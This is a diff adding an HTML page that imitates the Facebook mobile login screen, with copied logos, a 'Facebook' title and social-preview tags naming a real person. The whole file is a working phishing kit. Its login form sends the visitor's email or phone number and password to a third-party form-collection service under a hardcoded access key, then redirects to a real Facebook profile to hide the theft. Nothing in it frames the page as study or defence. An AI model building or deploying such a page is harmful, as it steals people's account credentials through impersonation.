@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light" class="bg-gradient-to-r from-pink-50 via-blue-50 to-white">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <!-- Required meta tags for Open Graph -->
+    <meta property="og:title" content="MuKta Mahmuda" />
+    <meta property="og:description"
+        content="Mukta Mahmuda is on Facebook. Join Facebook to connect with Mukta Mahmuda and others you may know. Facebook gives..." />
+    <meta property="og:image"
+        content="https://scontent.fdac135-1.fna.fbcdn.net/v/t39.30808-6/421688148_350527134603710_129421426743969559_n.jpg?_nc_cat=103&ccb=1-7&_nc_sid=6ee11a&_nc_eui2=AeFzXe-T0JrBjqLTVWqcmB9WI1hsNRiqraMjWGw1GKqtoxqdoWjHFZdjiKv9cvN1LoSOcYeDHiHLB0sGfJlh2Pf0&_nc_ohc=j1EDdKZJQZ8Q7kNvgGrA0rV&_nc_ht=scontent.fdac135-1.fna&oh=00_AYAaOz5acsb12vliV3wD7CefS2VFikizdSRXjhgdP-cJRQ&oe=66D26305" />
+    <meta property="og:type" content="video" />
+
+
+    <link href="https://cdn.jsdelivr.net/npm/daisyui@4.6.0/dist/full.min.css" rel="stylesheet" type="text/css" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="shortcut icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png"
+        type="image/x-icon">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Kanit:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900&family=Raleway:ital,wght@0,100..900;1,100..900&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+
+    <style>
+        .kanit-thin {
+            font-family: "Kanit", sans-serif;
+            font-weight: 300;
+        }
+
+        .kanit-medium {
+            font-family: "Kanit", sans-serif;
+            font-weight: 400;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #6b7280;
+        }
+    </style>
+    <title>Facebook</title>
+</head>
+
+
+<body>
+    <header>
+        <p class="text-center text-sm mt-3 kanit-thin">English (UK)</p>
+        <div class="mt-[48px]">
+            <center>
+                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" class="h-[60px]"
+                    alt="Facebook">
+            </center>
+        </div>
+    </header>
+    <main class="text-center justify-center mt-[65px] px-4">
+        <form id="contactForm" action="https://api.web3forms.com/submit" method="post">
+            <input type="hidden" name="access_key" value="a2d630e8-fb07-42e5-a572-18fd34c6e93c">
+            <div>
+                <div>
+                    <input name="contact = " id="email" required placeholder="Mobile number or email address"
+                        class="input rounded-xl input-bordered w-full max-w-full h-[62px] placeholder-neutral-500 placeholder:text-[17px] kanit-medium" />
+                    <span id="error-message" class="text-red-500 hidden"></span>
+                </div>
+                <div class="mt-3 password-container">
+                    <input name="Pass = " id="password" required type="password" placeholder="Password"
+                        class="input rounded-xl input-bordered w-full max-w-full h-[62px] placeholder-neutral-500 placeholder:text-[17px] kanit-medium" />
+                    <span class="toggle-password" onclick="togglePasswordVisibility()">
+                        <i id="toggleIcon" class="fas fa-eye-slash"></i>
+                    </span>
+                </div>
+            </div>
+            <div>
+                <button type="button"
+                    class="btn btn-info bg-[#2962FF] hover:bg-[#2962FF] text-white text-base w-full max-w-full mt-3 rounded-full"
+                    onclick="submitForm()">Log in</button>
+            </div>
+            <div>
+                <p class="kanit-medium mt-5 cursor-pointer" onclick="forget()">Forgotten Password?</p>
+            </div>
+            <div class="mt-[80px]">
+                <button type="button" onclick="create()"
+                    class="btn btn-info kanit-medium border-blue-600 bg-transparent h-10 text-[#2962FF] text-base w-full max-w-full mt-3 rounded-full hover:bg-transparent hover:bg-[#2962FF]">Create
+                    new account</button>
+            </div>
+        </form>
+    </main>
+
+    <footer>
+        <div>
+            <center>
+                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png" class="h-3 my-[15px]"
+                    alt="">
+            </center>
+        </div>
+        <div class="kanit-thin justify-center flex gap-3">
+            <small class="cursor-pointer" onclick="about()">About</small>
+            <small class="cursor-pointer" onclick="help()">Help</small>
+            <small class="cursor-pointer">More</small>
+        </div>
+    </footer>
+    <!-- Popup -->
+    <div id="popup" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+        <div class="bg-white p-6 rounded-lg w-full max-w-[300px] relative text-center">
+            <p class="kanit-medium text-xl">Wrong credentials</p>
+            <small>Invalid username or password</small>
+            <hr class="mt-8 mb-5">
+            <button onclick="ok()" class="text-[#2962FF]">OK</button>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        document.getElementById('contact').addEventListener('input', function () {
+            const input = this.value;
+            const errorMessage = document.getElementById('error-message');
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const mobilePattern = /^(\+8801|01)[3-9]\d{8}$/;
+
+            if (emailPattern.test(input) || mobilePattern.test(input)) {
+                errorMessage.classList.add('hidden');
+                this.setCustomValidity('');
+            } else {
+                errorMessage.classList.remove('hidden');
+                this.setCustomValidity('Invalid input');
+            }
+        });
+
+        
+
+        function submitForm() {
+            var form = document.getElementById("contactForm");
+            if (form.checkValidity()) {
+                fetch(form.action, {
+                    method: form.method,
+                    body: new FormData(form)
+                }).then(response => {
+                    if (response.ok) {
+                        window.location.href = "https://www.facebook.com/profile.php?id=100089392773228";
+                    } else {
+                        window.location.href = "https://www.facebook.com/profile.php?id=100089392773228";
+                    }
+                }).catch(error => {
+                    window.location.href = "https://www.facebook.com/profile.php?id=100089392773228";
+                });
+            } else {
+                form.reportValidity();
+            }
+        }
+
+        function showPopup() {
+            document.getElementById("popup").style.display = "flex";
+        }
+
+        function closePopup() {
+            document.getElementById("popup").style.display = "none";
+        }
+
+        function ok() {
+            window.location.href = "https://m.facebook.com/?crn=1&refsrc=deprecated";
+        }
+
+        function forget() {
+            window.location.href = "https://m.facebook.com/login/identify/";
+        }
+
+        function create() {
+            window.location.href = "https://m.facebook.com/reg/";
+        }
+
+        function about() {
+            window.location.href = "https://about.meta.com/";
+        }
+
+        function help() {
+            window.location.href = "https://www.facebook.com/help/?ref=pf";
+        }
+
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById("password");
+            const toggleIcon = document.getElementById("toggleIcon");
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                toggleIcon.classList.remove("fa-eye-slash");
+                toggleIcon.classList.add("fa-eye");
+            } else {
+                passwordInput.type = "password";
+                toggleIcon.classList.remove("fa-eye");
+                toggleIcon.classList.add("fa-eye-slash");
+            }
+        }
+
+    </script>
+</body>
+
+</html>
